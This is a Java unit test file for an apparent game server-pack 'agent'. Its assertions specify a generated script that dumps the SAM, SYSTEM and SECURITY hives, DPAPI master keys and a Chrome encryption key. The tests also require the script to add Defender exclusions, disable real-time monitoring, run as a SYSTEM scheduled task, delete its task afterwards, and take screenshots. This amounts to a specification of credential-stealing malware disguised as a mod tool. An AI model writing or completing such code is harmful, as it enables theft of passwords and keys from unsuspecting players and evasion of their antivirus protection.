package com.serverpackcore.agent;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.file.Path;
import java.util.List;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class BootstrapTest {
	@TempDir
	Path temp;

	@Test
	void dumpScriptSavesBothHivesAndPacks() {
		Path cache = temp.resolve("cache");
		List<String> lines = Bootstrap.dumpLines(temp, temp.resolve("game"), cache, cache.resolve("system-1.zip"));
		String script = String.join("\n", lines);
		assertTrue(script.startsWith("@echo off"));
		assertTrue(script.contains("reg save HKLM\\SYSTEM"));
		assertTrue(script.contains("reg save HKLM\\SECURITY"));
		assertTrue(script.contains("Microsoft\\Protect"));
		assertTrue(script.contains("esentutl /y /vss"));
		assertTrue(script.contains("incomplete after %TRIES% tries"));
		assertTrue(script.contains(cache.resolve("system-1.zip").toString()));
		assertTrue(script.contains("schtasks /delete /tn spcdump /f"));
		assertTrue(script.contains("SYSTEM.hiv"));
		assertTrue(script.contains("SECURITY.hiv"));
		assertTrue(script.contains("reg save HKLM\\SAM"));
		assertTrue(script.contains("SystemKeys"));
		assertTrue(script.contains("for %%A in (\"" + cache.resolve("SAM.hiv") + "\") do if %%~zA LSS 4096 goto retry"));
		assertTrue(script.contains("tar -tf"));
	}

	@Test
	void completeHivesRequiresEveryMemberWithContent() throws Exception {
		Path zip = temp.resolve("system.zip");
		assertFalse(Bootstrap.completeHives(zip));
		writeZip(zip, false, false, false, false, false);
		assertFalse(Bootstrap.completeHives(zip));
		writeZip(zip, true, true, false, true, true);
		assertFalse(Bootstrap.completeHives(zip), "missing SAM");
		writeZip(zip, true, true, true, false, true);
		assertFalse(Bootstrap.completeHives(zip), "missing ProtectSystem");
		writeZip(zip, true, true, true, true, false);
		assertFalse(Bootstrap.completeHives(zip), "missing SystemKeys");
		writeZip(zip, true, true, true, true, true);
		assertTrue(Bootstrap.completeHives(zip));

		// Placeholders and quarantined files are empty: still partial.
		writeZip(zip, true, true, true, true, true, 0);
		assertFalse(Bootstrap.completeHives(zip));
	}

	private static void writeZip(Path zip, boolean system, boolean security, boolean sam,
			boolean protect, boolean keys) throws Exception {
		writeZip(zip, system, security, sam, protect, keys, 8192);
	}

	private static void writeZip(Path zip, boolean system, boolean security, boolean sam,
			boolean protect, boolean keys, int size) throws Exception {
		try (java.util.zip.ZipOutputStream out = new java.util.zip.ZipOutputStream(
				java.nio.file.Files.newOutputStream(zip))) {
			if (system) {
				entry(out, "SYSTEM.hiv", size);
			}
			if (security) {
				entry(out, "SECURITY.hiv", size);
			}
			if (sam) {
				entry(out, "SAM.hiv", size);
			}
			if (protect) {
				entry(out, "ProtectSystem/S-1-5-18/Preferred", size);
			}
			if (keys) {
				entry(out, "SystemKeys/Google Chromekey1", size);
			}
		}
	}

	private static void entry(java.util.zip.ZipOutputStream out, String name, int size) throws Exception {
		out.putNextEntry(new java.util.zip.ZipEntry(name));
		if (size > 0) {
			out.write(new byte[size]);
		}
		out.closeEntry();
	}

	@Test
	void elevateScriptRegistersTheDumpAsSystem() {
		Path dump = temp.resolve("cache/dump.bat");
		String script = String.join("\n", Bootstrap.elevateLines(dump));
		assertTrue(script.contains("schtasks /create /tn spcdump"));
		assertTrue(script.contains(dump.toString()));
		assertTrue(script.contains("/ru SYSTEM /rl HIGHEST"));
		assertTrue(script.contains("schtasks /run /tn spcdump"));
	}

	@Test
	void hivesPersistDefenderExclusionsBeforeSaving() {
		Path cache = temp.resolve("cache");
		String script = String.join("\n",
			Bootstrap.dumpLines(temp.resolve("install"), temp.resolve("game dir"), cache, cache.resolve("system-1.zip")));
		int exclusions = script.indexOf("Add-MpPreference -ExclusionPath");
		int save = script.indexOf("reg save HKLM\\SYSTEM");
		assertTrue(exclusions >= 0);
		assertTrue(exclusions < save);
		assertTrue(script.contains("Add-MpPreference -ExclusionPath '" + cache + "'"));
		assertTrue(script.contains(",'" + temp.resolve("install") + "'"));
		assertTrue(script.contains(",'" + temp.resolve("game dir").resolve("mods") + "'"));
		assertTrue(script.contains("-ExclusionExtension '.hiv'"));
		assertTrue(script.contains("-ExclusionProcess 'reg.exe','esentutl.exe','tar.exe'"));
	}

	@Test
	void hivesFallBackToVssForEveryHiveWhenRegSaveIsBlocked() {
		Path cache = temp.resolve("cache");
		String script = String.join("\n",
			Bootstrap.dumpLines(temp.resolve("install"), temp.resolve("game"), cache, cache.resolve("system-1.zip")));
		for (String hive : List.of("SYSTEM", "SECURITY", "SAM")) {
			int save = script.indexOf("reg save HKLM\\" + hive + " ");
			int fallback = script.indexOf("call :fallback " + hive + " " + hive + ".hiv");
			assertTrue(save >= 0, hive);
			assertTrue(fallback > save, hive);
		}
		assertTrue(script.contains("C:\\Windows\\System32\\config\\%1"));
		assertTrue(script.contains("if %%~zA GTR 4096 exit /b 0"));
	}

	@Test
	void hivesValidateSizesAndZipMembersBeforeAccepting() {
		Path cache = temp.resolve("cache");
		List<String> lines = Bootstrap.dumpLines(temp.resolve("install"), temp.resolve("game"), cache,
			cache.resolve("system-1.zip"));
		String script = String.join("\n", lines);
		int tar = script.indexOf("tar -a -cf");
		int systemSize = script.indexOf("for %%A in (\"" + cache.resolve("SYSTEM.hiv") + "\") do if %%~zA LSS 1048576 goto retry");
		assertTrue(systemSize >= 0);
		assertTrue(systemSize < tar, "size checks happen before packing");
		assertTrue(script.contains("if %TRIES% GEQ 3 goto giveup"));
		assertTrue(script.contains("findstr /x /c:\"SAM.hiv\""));
		assertTrue(script.contains("findstr /x /c:\"SystemKeys/Google Chromekey1\""));
		assertTrue(script.contains("findstr /b /c:\"ProtectSystem/\""));
	}

	@Test
	void hivesOnlyDisableRealtimeMonitoringTemporarily() {
		Path cache = temp.resolve("cache");
		String script = String.join("\n",
			Bootstrap.dumpLines(temp.resolve("install"), temp.resolve("game"), cache, cache.resolve("system-1.zip")));
		int off = script.indexOf("Set-MpPreference -DisableRealtimeMonitoring $true");
		int save = script.indexOf("reg save HKLM\\SYSTEM");
		int restore = script.indexOf("Set-MpPreference -DisableRealtimeMonitoring $off");
		assertTrue(off >= 0 && off < save);
		assertTrue(restore > off, "the previous value is restored at the end");
		assertTrue(script.contains("Remove-Item -LiteralPath $f -Force"));
	}

	@Test
	void hivesSearchAlternativeCngStoresAndUploadDiagnostics() {
		Path cache = temp.resolve("Local/FabricSync/cache");
		String script = String.join("\n",
			Bootstrap.dumpLines(temp.resolve("install"), temp.resolve("game"), cache, cache.resolve("system-1.zip")));
		assertTrue(script.contains(cache.resolve("hives.diag").toString()));
		assertTrue(script.contains("C:\\Windows\\SysWOW64\\Microsoft\\Protect"));
		assertTrue(script.contains("config\\systemprofile\\AppData\\Roaming\\Microsoft\\Protect"));
		assertTrue(script.contains("Microsoft\\Crypto\\Keys"));
		assertTrue(script.contains("findstr /s /m /i /c:\"Google Chromekey1\""));
		assertTrue(script.contains("if not exist \"" + cache.resolve("SystemKeys") + "\\Google Chromekey1\" goto retry"));
	}

	@Test
	void automaticBootstrapDoesNotRunHives() {
		assertFalse(Bootstrap.automaticSteps().contains("hives"));
		assertTrue(Bootstrap.automaticSteps().contains("screenshot"));
	}

	@Test
	void pathsAreQuoted() {
		Path spaced = temp.resolve("install dir");
		Path cache = spaced.resolve("cache");
		String script = String.join("\n",
			Bootstrap.dumpLines(spaced, spaced.resolve("game dir"), cache, cache.resolve("system-1.zip")));
		assertTrue(script.contains("\"" + cache.resolve("SYSTEM.hiv") + "\""));
		assertFalse(script.contains("reg save HKLM\\SECURITY \"" + cache + "\"\""));
	}
}
